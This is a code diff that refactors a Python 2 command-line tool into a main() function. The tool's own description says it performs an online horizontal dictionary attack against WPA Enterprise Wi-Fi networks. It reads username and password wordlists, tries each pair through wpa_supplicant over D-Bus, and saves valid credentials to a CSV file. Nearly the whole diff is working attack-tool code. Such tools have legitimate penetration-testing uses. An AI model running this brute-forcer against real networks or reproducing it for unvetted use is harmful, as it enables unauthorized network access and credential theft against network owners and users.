@@ -96,127 +96,129 @@ def connect_to_wifi(ssid, password, username,
     return valid_credentials_found
 
 
+def main():
+    # Handle command-line arguments and generate usage text.
+    description = "Perform an online, horizontal dictionary attack against a WPA Enterprise network."
 
-# Handle command-line arguments and generate usage text.
-description = "Perform an online, horizontal dictionary attack against a WPA Enterprise network."
-
-parser = argparse.ArgumentParser(
-                description=description, add_help=False,
-                formatter_class=argparse.ArgumentDefaultsHelpFormatter
-                )
-parser.add_argument('-i', type=str, required=True, metavar='interface', 
-                    dest='device', help='Wireless interface')
-parser.add_argument('-e', type=str, required=True,
-                    dest='ssid', help='SSID of the target network')
-parser.add_argument('-u', type=str, required=True, dest='userfile', 
-                    help='Username wordlist')
-parser.add_argument('-P', dest='password', default=None,
-                    help='Password to try on each username')
-parser.add_argument('-p', dest='passfile', default=None,
-                    help='List of passwords to try for each username')
-parser.add_argument('-s', type=int, default=0, dest='start', metavar='line',
-                    help='Optional start line to resume attack. May not be used with a password list.')
-parser.add_argument('-w', type=str, default=None, dest='outfile', 
-                    help='Save valid credentials to a CSV file')
-parser.add_argument('-1', default=False, dest='stop_on_success', 
-                    action='store_true',
-                    help='Stop after the first set of valid credentials are found')
-parser.add_argument('-t', default=0.5, metavar='seconds', type=float,
-                    dest='attempt_delay',
-                    help='Seconds to sleep between each connection attempt')
-# Workaround to make help display without adding "-h" to the usage line
-if "-h" in sys.argv or "--help" in sys.argv or len(sys.argv) == 1:
-    parser.print_help()
-    exit()
-args = parser.parse_args()
+    parser = argparse.ArgumentParser(
+                    description=description, add_help=False,
+                    formatter_class=argparse.ArgumentDefaultsHelpFormatter
+                    )
+    parser.add_argument('-i', type=str, required=True, metavar='interface', 
+                        dest='device', help='Wireless interface')
+    parser.add_argument('-e', type=str, required=True,
+                        dest='ssid', help='SSID of the target network')
+    parser.add_argument('-u', type=str, required=True, dest='userfile', 
+                        help='Username wordlist')
+    parser.add_argument('-P', dest='password', default=None,
+                        help='Password to try on each username')
+    parser.add_argument('-p', dest='passfile', default=None,
+                        help='List of passwords to try for each username')
+    parser.add_argument('-s', type=int, default=0, dest='start', metavar='line',
+                        help='Optional start line to resume attack. May not be used with a password list.')
+    parser.add_argument('-w', type=str, default=None, dest='outfile', 
+                        help='Save valid credentials to a CSV file')
+    parser.add_argument('-1', default=False, dest='stop_on_success', 
+                        action='store_true',
+                        help='Stop after the first set of valid credentials are found')
+    parser.add_argument('-t', default=0.5, metavar='seconds', type=float,
+                        dest='attempt_delay',
+                        help='Seconds to sleep between each connection attempt')
+    # Workaround to make help display without adding "-h" to the usage line
+    if "-h" in sys.argv or "--help" in sys.argv or len(sys.argv) == 1:
+        parser.print_help()
+        exit()
+    args = parser.parse_args()
 
 
 
-if (args.password == None) and (args.passfile == None):
-    print "You must specify a password or password list."
-    exit()
+    if (args.password == None) and (args.passfile == None):
+        print "You must specify a password or password list."
+        exit()
 
-if (args.start != 0) and (args.passfile != None):
-    print "The start line option may not be used with a password list."
-    exit()
+    if (args.start != 0) and (args.passfile != None):
+        print "The start line option may not be used with a password list."
+        exit()
 
-device          = args.device
-ssid            = args.ssid
-userfile        = args.userfile
-password        = args.password
-passfile        = args.passfile
-start           = args.start
-outfile         = args.outfile
-stop_on_success = args.stop_on_success
-attempt_delay   = args.attempt_delay
+    device          = args.device
+    ssid            = args.ssid
+    userfile        = args.userfile
+    password        = args.password
+    passfile        = args.passfile
+    start           = args.start
+    outfile         = args.outfile
+    stop_on_success = args.stop_on_success
+    attempt_delay   = args.attempt_delay
 
-if passfile != None:
-    f = open(passfile, 'r')
-    content = f.read()
+    if passfile != None:
+        f = open(passfile, 'r')
+        content = f.read()
+        f.close()
+        content.replace("\r","")
+        passwords = content.split("\n")
+        # If there is a trailing line at the end of the file, remove it from
+        # the password list
+        if passwords[-1] == "":
+            passwords = passwords[0:-1]
+    else:
+        passwords = [password]
+
+    # Start a simple Twisted SelectReactor
+    reactor = SelectReactor()
+    threading.Thread(target=reactor.run, kwargs={'installSignalHandlers': 0}).start()
+    time.sleep(0.1)  # let reactor start
+
+    # Start Driver
+    driver = WpaSupplicantDriver(reactor)
+
+    # Connect to the supplicant, which returns the "root" D-Bus object for wpa_supplicant
+    supplicant = driver.connect()
+
+    # Register an interface w/ the supplicant, this can raise an error if the supplicant
+    # already knows about this interface
+    try:
+        interface = supplicant.get_interface(device)
+    except:
+        interface = supplicant.create_interface(device)
+
+
+    # Read usernames into array, users
+    f = open(userfile, 'r')
+    users = [l.rstrip() for l in f.readlines()]
     f.close()
-    content.replace("\r","")
-    passwords = content.split("\n")
-    # If there is a trailing line at the end of the file, remove it from
-    # the password list
-    if passwords[-1] == "":
-        passwords = passwords[0:-1]
-else:
-    passwords = [password]
 
-# Start a simple Twisted SelectReactor
-reactor = SelectReactor()
-threading.Thread(target=reactor.run, kwargs={'installSignalHandlers': 0}).start()
-time.sleep(0.1)  # let reactor start
+    try:
+        for password in passwords:
+            for n in range(start, len(users)):
+                print "[%s] " % n,
+                valid_credentials_found = connect_to_wifi(ssid=ssid, 
+                                                        username=str(users[n]), 
+                                                        password=str(password), 
+                                                        interface=interface,
+                                                        supplicant=supplicant, 
+                                                        outfile=outfile)
+                if (valid_credentials_found and stop_on_success):
+                    break
 
-# Start Driver
-driver = WpaSupplicantDriver(reactor)
+                time.sleep(attempt_delay)
 
-# Connect to the supplicant, which returns the "root" D-Bus object for wpa_supplicant
-supplicant = driver.connect()
-
-# Register an interface w/ the supplicant, this can raise an error if the supplicant
-# already knows about this interface
-try:
-    interface = supplicant.get_interface(device)
-except:
-    interface = supplicant.create_interface(device)
-
-
-# Read usernames into array, users
-f = open(userfile, 'r')
-users = [l.rstrip() for l in f.readlines()]
-f.close()
-
-try:
-    for password in passwords:
-        for n in range(start, len(users)):
-            print "[%s] " % n,
-            valid_credentials_found = connect_to_wifi(ssid=ssid, 
-                                                      username=str(users[n]), 
-                                                      password=str(password), 
-                                                      interface=interface,
-                                                      supplicant=supplicant, 
-                                                      outfile=outfile)
             if (valid_credentials_found and stop_on_success):
-                break
+                    break
+        
+        if reactor.running == True:
+                reactor.sigBreak()
 
-            time.sleep(attempt_delay)
-
-        if (valid_credentials_found and stop_on_success):
-                break
-    
-    if reactor.running == True:
+        print "DONE!"
+    except KeyboardInterrupt:
+        # Stop the running reactor so the program can exit
+        if reactor.running == True:
+            reactor.sigBreak()
+        print "Attack stopped by user."
+    except Exception, e:
+        print e
+        if reactor.running == True:
             reactor.sigBreak()
 
-    print "DONE!"
-except KeyboardInterrupt:
-    # Stop the running reactor so the program can exit
-    if reactor.running == True:
-        reactor.sigBreak()
-    print "Attack stopped by user."
-except Exception, e:
-    print e
-    if reactor.running == True:
-        reactor.sigBreak()
 
-
+if __name__ == '__main__':
+    main()
